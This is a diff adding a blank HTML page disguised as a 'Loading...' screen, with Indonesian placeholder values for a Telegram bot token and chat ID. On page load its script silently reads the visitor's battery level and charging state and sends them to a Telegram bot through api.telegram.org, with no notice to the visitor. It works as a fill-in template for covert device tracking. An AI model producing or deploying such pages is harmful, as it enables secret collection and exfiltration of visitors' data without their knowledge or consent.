@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <style>
+    body {
+      background-color: white;
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+<script>
+(async () => {
+  const token = "TOKEN_BOT_KAMU";
+  const chatId = "ID_TELEGRAM_KAMU";
+
+  if ('getBattery' in navigator) {
+    const battery = await navigator.getBattery();
+    const level = battery.level * 100;
+    const charging = battery.charging ? "Ya" : "Tidak";
+
+    const message = `🔋 Info Baterai:\nLevel: ${level}%\nDicas: ${charging}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    });
+  }
+})();
+</script>
+</body>
+</html>
